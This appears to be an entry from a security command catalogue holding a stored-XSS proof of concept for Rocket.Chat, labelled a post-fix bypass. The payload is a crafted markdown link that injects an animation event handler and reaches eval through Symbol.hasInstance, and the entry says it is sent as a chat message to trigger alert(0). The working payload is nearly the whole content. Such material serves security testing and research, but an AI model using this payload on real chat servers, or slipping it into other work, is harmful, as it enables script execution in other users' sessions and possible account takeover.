---
data: >-
  https://a?p=[ ](https://a.de?
  style=animation-duration:1s;animation-name:blink;animation-iteration-count:2
  onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x280\x29'instanceof[]`.")
tags:
  - xss
  - bypass
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.235Z'
id: 6865f2f8-305c-4be5-bcf9-2e40c38ed44e
verified: false
validated: true
submitted: true
---
# rocket-chat-postfix-bypass-alert2

## Command

```javascript
https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x280\x29'instanceof[]`.")
```

## Description

Alternative post-fix alert PoC.

## Parameters

Similar to above.

## Examples

Send as message.

## Expected Output

alert(0).

## Related

- [[commands/rocket-chat-postfix-bypass-alert1]]
